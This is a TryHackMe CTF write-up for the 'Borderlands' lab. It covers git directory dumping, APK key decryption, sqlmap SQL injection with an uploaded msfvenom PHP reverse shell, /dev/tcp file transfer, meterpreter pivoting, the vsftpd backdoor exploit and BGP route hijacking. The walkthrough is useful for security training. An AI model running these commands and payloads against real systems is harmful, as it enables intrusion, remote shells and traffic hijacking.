---
layout: post
permalink: /posts/thm/borderlands
title: "THM write-up: Borderlands"
date: 2020-08-13 13:48
tags: tryhackme CTF recon reverse_engineering sqli bgp
description: "Welcome to an extreme level of tryhackme CTF challenge. For your information, this is one of the toughest challenges in the THM server."
---

![titlecard](/assets/images/THM/2020-08-13-borderlands/1.png)

[Link: https://tryhackme.com/room/borderlands](https://tryhackme.com/room/borderlands)

Greeting again! Welcome to an extreme level of tryhackme CTF challenge. For your information, this is one of the toughest challenges in the THM server. I managed to solve it within 3 days with a full aid from a networking expert, Tsuki. This challenge really improves my networking skill especially on the BGP (border gateway protocol) and pivoting. If you are having no clue about BGP and pivoting, [this article](https://www.cloudflare.com/learning/security/glossary/what-is-bgp/) and [this article](https://www.tutorialspoint.com/metasploit/metasploit_pivoting.htm) might tell you the basic concept of those terms. Alright, let's get started

## Task 1: Deploy, attack, and pivot

There are a total of 7 tasks on this challenge. The first three tasks are finding the flag from android apps, web apps, and git. The android app is a bit tricky while the git can be done with an exploit. The next 4 tasks are more interesting. It involves SQL injection, port scanning, port forwarding, FTP exploitation, and BGP hijacking. All this stuff will be explained in this write-up.

### Task 1-2: Web flag

I kick off my first task on finding the web flag. Why? I will explain later on. The web app is located in Port 80.

![web](/assets/images/THM/2020-08-13-borderlands/2.png)

This is the main page of the web app. Be sure to download the APK file (red square) as we need it for a later task. If you have done Nmap scan before, you will notice the following thing.

![the git](/assets/images/THM/2020-08-13-borderlands/3.png)

The web app contains a git directory. Accessing the directory gives the following status.

![403](/assets/images/THM/2020-08-13-borderlands/4.png)

A 403 status. This reminds me of the git exploit, you can read the proof of concept right inside [this article](https://github.com/bl4de/research/tree/master/hidden_directories_leaks#hidden-directories-and-files-as-a-source-of-sensitive-information-about-web-application). To make things simple, I'm going to pull all the files from the git using [gitHack](https://github.com/lijiejie/GitHack).  Clone the git and punch in the following command.

```
python GitHack.py http://<Target IP>/.git/
```

![git files](/assets/images/THM/2020-08-13-borderlands/5.png)

We just pulled the entire server file using GitHack. Please be noted that the concept of Githack is similar to the git exploit and I just make things simple here. In short, I'm a script kiddie now. That is a sin XD.

By reading the file, I'm stumbled across the web app flag. It is located at home.php.

One flag down!

### Task 1-3: Git flag

First off, download the git log from the site. The URL is

```
http://<machine IP>/.git/logs/HEAD
```

![log](/assets/images/THM/2020-08-13-borderlands/6.png)

Noticed that the author remove the sensitive data on the **object b2f776a52fe81a731c6c0fa896e7f9548aafceab**. The best bet is we can find the sensitive data in the **object 79c9539b6566b06d6dec2755fdf58f5f9ec8822f**. Use the following URL to extract the object from the site (The first two letter named as a directory)

```
http://<Machine IP>/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

Before we look into the object, we have to create a dummy git folder.

```
git init
```

![all the files](/assets/images/THM/2020-08-13-borderlands/7.png)

I created my own dummy inside the folder in which all the server files have been pulled. Locate inside the dummy git and then object, create a folder named '79'. Copy the freshly downloaded object file into folder 79.

![download](/assets/images/THM/2020-08-13-borderlands/8.png)

Locate into the .git folder and read the content of the object with the following command.

```
git cat-file -p 79c9539b6566b06d6dec2755fdf58f5f9ec8822f
```

![gitcat](/assets/images/THM/2020-08-13-borderlands/9.png)

We got a tree **object 51d63292792fb7f97728cd3dcaac3ef364f374ba**. Similar to previous step, download the object file with the following URL.

```
http://<Machine IP>/.git/objects/51/d63292792fb7f97728cd3dcaac3ef364f374ba
```

Create a **51** folder inside the object file and copy the downloaded object inside the folder. After that, read the tree object.

![tree object](/assets/images/THM/2020-08-13-borderlands/10.png)

The sensitive data is stored inside api.php or object **2229eb414d7945688b90d7cd0a786fd888bcc6a4**. Repeat the same stuff again and read the object.

You get your git flag.

### Task 1-1: APK flag

Time to make a visit on the android apps. For your information, you can actually finish the task with apktool only. In order to make things simple to understand, I used [jadx](https://github.com/skylot/jadx) and apktool. Your task is to find and decrypt the API key which is a flag.

![apikey](/assets/images/THM/2020-08-13-borderlands/11.png)

From the jadx decompiler, the encrypted key variable is called **'encrypted_api_key'**. After that, reverse engineer the apk using apktool. Then, make a search for the variable name.

```
apktool d mobile-app-prototype.apk
grep -rn 'encrypted_api_key'
```

![encrypt](/assets/images/THM/2020-08-13-borderlands/12.png)

If you refer to the api.php before, you can find the first 20 letters of the android API key. That is why I put tasks 1-1 after task 1-2.

![firstwords](/assets/images/THM/2020-08-13-borderlands/13.png)

Make a comparison between the two strings.

```
CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo (Encrypted)
ANDVOWLDLAS5Q8OQZ2tu           (Plaintext)
```

You will notice the numbering is in the same position. So, this is either a vigenere cipher or a Ceaser cipher. Testing with Cease cipher does not yield any luck on it. If you refer back to the jadx, you will see the decrypt function require a key. I'm 100% sure the cipher is a vigenere. To obtain the key, simply do a reverse key search based on the vigenere table.

![vigenere table](/assets/images/THM/2020-08-13-borderlands/14.png)

The left letter bar represents plaintext, the upper letter bar represents key (either one, the table is symmetrical) and the inner table is ciphertext. Let's take the second letter and compare it.

```
B (Encrypt)
N (Plaintext)
O (Key)
```

![vigenre poc](/assets/images/THM/2020-08-13-borderlands/15.png)

If you keep repeating the process, you will eventually find the key. The key is CONTEXT. Use the online tool and capture the last API key.

### Task 1-4: SQL injection

Refer to the home.php, the site actually vulnerable to SQL injection. The injectable URL is

```
http://<Machine IP>/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
```

By following up on [this tutorial](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/), we are able to create a reverse shell for the machine. If you are lazy to open up the Burp suite, copy the following response as save it as **r.txt**

```
GET /api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD HTTP/1.1
Host: <Machine IP>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=uafomq8a14mf4lkb7pktbrgt69
Connection: close
Upgrade-Insecure-Requests: 1
```

Make sure you change the host IP address before saving it. After that, launch the sqlmap with the following command.

```
sqlmap -r r.txt --dbs --batch
```

![sqlmap](/assets/images/THM/2020-08-13-borderlands/16.png)

If you are able to get a list of SQL tables, you are good to go. Or else, check the r.txt file for any misconfiguration. As for the next step, we are going to create a SQL upload page.

```
sqlmap -r r.txt -D myfirstwebsite --os-shell
```

![sqlmap more](/assets/images/THM/2020-08-13-borderlands/17.png)

Select PHP (option 4), 'no' option and then brute-force (option 4).

![sqlmap more and more](/assets/images/THM/2020-08-13-borderlands/18.png)

Enter /var/www/html as custom directory.

![sqlmap final](/assets/images/THM/2020-08-13-borderlands/19.png)

Copy the sqlmap file uploader URL and visit the site.

![uploader](/assets/images/THM/2020-08-13-borderlands/20.png)

We are going to generate a reverse shell using msfvenom.

```
msfvenom -p php/meterpreter/reverse_tcp lhost=<tunnel IP> lport=4445 -f raw
```

![msfvenom](/assets/images/THM/2020-08-13-borderlands/21.png)

Copy the text (pink highlighted) and save it as shell.php. After that, upload the shell.php using the sqlmap uploader.

![upload it](/assets/images/THM/2020-08-13-borderlands/22.png)

Open up msfconsole and punch the following setting.

```
msf> use multi/handler
msf exploit(handler) > set lport 4445
msf exploit(handler) > set lhost tun0
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > exploit
```

Visit the following URL to trigger the reverse shell

```
http://<Machine IP>/shell.php
```

### Task 1-5: Pivot the machine

There is numerous way to complete this task. User tsuki recommends using Nmap static binary to do the recon and transfer the file using ncat and bash shell. (I haven't test it)

```
ncat -lvnp 80 < nmap
cat > /tmp/nmap < /dev/tcp/<tunnel IP>/80
```

My approach is a bit dumb but it just works. Basically I compressed the file and split into 512 Kb size and then upload through the sqlmap uploader. This is because of the limitation of upload file size by Nginx server.

```
split -b 512K nmap.tar.xz
```

After that, we are going to join the split packet in the victim machine.

```
cat xa* > namp.tar.xz
tar -xvf nmap.tar.xz
```

Before we do a scan, we have to know the private IP address range.

![address range](/assets/images/THM/2020-08-13-borderlands/23.png)

The most suitable candidate is 172.x.x.x. Why? Private IP started with 10.x.x.x used by THM and 192.168.x.x is usually for home router. Context is a big company, 172.x.x.x might be our only way in. If we brute-forcing our way in, there will be more than 1 million possibilities. The most commonly used subnet is 172.16.0.0/16. Just do a fast scan with the following command.

```
./nmap -sn -T5 --min-parallelism 100  172.16.0.0/16
```

![nmap](/assets/images/THM/2020-08-13-borderlands/24.png)

Look like we have something on the 172.16.1.0/24 subnet. We are going to do a deeper scan of it.

![nmap deeper](/assets/images/THM/2020-08-13-borderlands/25.png)

The victim IP we are in is 172.16.1.10. Note that, 172.16.1.128 is up with both FTP and BGP server on. Since the victim machine we are currently in is very limited in resource, we have to forward the port 21 to the localhost using meterpreter from the reverse shell.  (simply exit the shell)

```
meterpreter> portfwd add -l 21 -p 21 -r 172.16.1.128
```

After that, examine the banner lead us to [vulnerability](https://www.exploit-db.com/exploits/17491).

![vuln](/assets/images/THM/2020-08-13-borderlands/26.png)

If you read [this article](https://sweshsec.wordpress.com/2015/07/31/vsftpd-vulnerability-exploitation-with-manual-approach/) which is manual vsftpd exploitation, we need to port forward port 6200 as well. However, the exploit won't work if you port forward port 21 and 6200 together.

#### Step 1: Port forward port 21

We have done it previously.

#### Step 2: Open Metasploit and exploit the port

Use the following command to exploit the port.

```
msf5> use exploit/unix/ftp/vsftpd_234_backdoor
msf5> set RHOSTS 127.0.0.1
msf5> exploit
```

You will get a no session after that.

![exploit ftp](/assets/images/THM/2020-08-13-borderlands/27.png)

#### Step 3: Port forward port 6200

Simply input the following command to port forward port 6200.

```
meterpreter> portfwd add -l 6200 -p 6200 -r 172.16.1.128
```

#### Step 4: Re-exploitation

Re-exploit the port again and you will get a root shell from 172.16.1.128.

![root](/assets/images/THM/2020-08-13-borderlands/28.png)

Now, capture the flag

### Task 1-5 and 1-6: UDP and TCP flag

I would like to credit this task to Tsuki who give me so many hints on solving this task. This task is almost similar to the [HTB carrier](https://0xrick.github.io/hack-the-box/carrier/) where you need to play around with the BGP configure file.

First off, we are going to launch the BGP config shell with the following command.

```
vtysh
```

![config file](/assets/images/THM/2020-08-13-borderlands/29.png)

Our main objective is to hijack the sever with flag and re-route the flag packet to us. [This article provides a simplified explanation](https://www.cloudflare.com/learning/security/glossary/bgp-hijacking/) of BGP hijacking. Next, enter the BGP configuration mode with the following command.

```
router1.ctx.ctf# config terminal
```

We need to add a route to make sure the flag server route the packet to us.

```
router1.ctx.ctf(config)# router bgp 60001
router1.ctx.ctf(config)# network 172.16.2.0/25
router1.ctx.ctf(config)# network 172.16.3.0/25
router1.ctx.ctf(config)# end
router1.ctx.ctf# clear ip bgp *
```

Do a short check on the route.

![full config](/assets/images/THM/2020-08-13-borderlands/30.png)

It looks like all the traffics routes to us. If you finished with the configuration, read the incoming packet with TCP dump.

```
tcpdump -i eth0 -A
```

The flag will be redirected to you in a jiffy.

## Additional note

```
Hi there!

Well done on solving the box and writing it up nicely.
I’m one of the people responsible for it from our side.

A few things I noticed that you may have missed (or just approached differently):

·         PDFs have username as the creator and this lets you brute force the login page with e.g. rockyou. Git stuff is not strictly necessary for progression.

·         Android app has a portrait of Blaise de Vigenère as a hint. Google reverse image search should do the trick.

·         Jadx is enough on its own: mobile-app-prototype.apk->Resources->resources.arsc->values->strings.xml

·         You can simply pass the url with the –u flag. Though yet again, using –r is a good move.

·         You say to use ‘/var/www/html’ but don’t explain why. The ‘common locations’ option in sqlmap will get it, for example.

·         you have a typo:

o   If you are lazy to open up the Burp suite, copy the following response as save it as r.txt

·         you can also use port 8080 for a bind shell if you prefer that (notice that it comes up as closed, not filtered in the port scan). We had some discussions while making the challenge whether blocking all egress networking would be too nasty...

·         There is python installed on the webapp box as well to allow writing your own port scanner

o   Though dropping nmap on there is better

·         On the webapp box, 'ip addr' will show local ip addresses and subnets (no need to scan /16).

·         For vsftpd, you could also use a simple python script

·         Yes, this is very similar to Carrier. Basically, I used this as an opportunity to learn more about BGP and actually set it up from scratch.

·         For an extra mile task, try getting the last 2 flags without using tcpdump (or other sniffing software) – just receive it as if it were meant for you

o   Depending on how you view your dumped data, the TCP flag can be a bit more of a pain than the UDP one. In particular, it is sent 1 character at a time – if you dump full packets (not just the data payload), you would need to notice it and manually put it back together.

o   Unfortunately we did not have the time to set up a final struggle of breaking weak SSL ciphers


Anyhow, yet again, well done and well written up!
```

## Conclusion

That's it, it took me a long time for this challenge. To be honest, the BGP room is quite rare to be found. Since the room is created by [context information security](https://www.contextis.com/en) for hackback2, we are expecting this room to be high in difficulty. Alright, I hope you learn something today and for me, I learned a lot from this box, especially the networking part. Until next time ;)
